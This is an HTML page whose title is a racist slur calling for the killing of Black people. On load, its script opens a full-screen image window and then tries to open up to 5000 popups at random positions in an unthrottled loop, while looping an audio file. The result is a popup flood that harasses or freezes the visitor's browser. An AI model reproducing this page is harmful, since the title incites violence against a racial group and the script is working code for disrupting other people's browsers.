<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Kill Niggers</title>
</head>
<body>

  <audio id="sound1" src="sound1.mp3" loop></audio>

  <script>
    window.onload = function() {

      const sound1 = document.getElementById("sound1");

      // Open large main window (1920x1080)
      window.open(
        "IMG_20260304_110715.jpg",
        "_blank",
        "width=1920,height=1080,left=0,top=0"
      );

      // Open small popups immediately (limited amount)
      let count = 0;
      const maxWindows = 5000;

      const interval = setInterval(() => {

        const left = Math.floor(Math.random() * 800);
        const top = Math.floor(Math.random() * 600);

        window.open(
          "IMG_20260304_110715.jpg",
          "_blank",
          `width=300,height=200,left=${left},top=${top}`
        );

        count++;

        if (count >= maxWindows) {
          clearInterval(interval);
        }

      }, 0);

      // Play looping sound
      sound1.play().catch(() => {
        console.log("Autoplay blocked by browser.");
      });

    };
  </script>

</body>
</html>
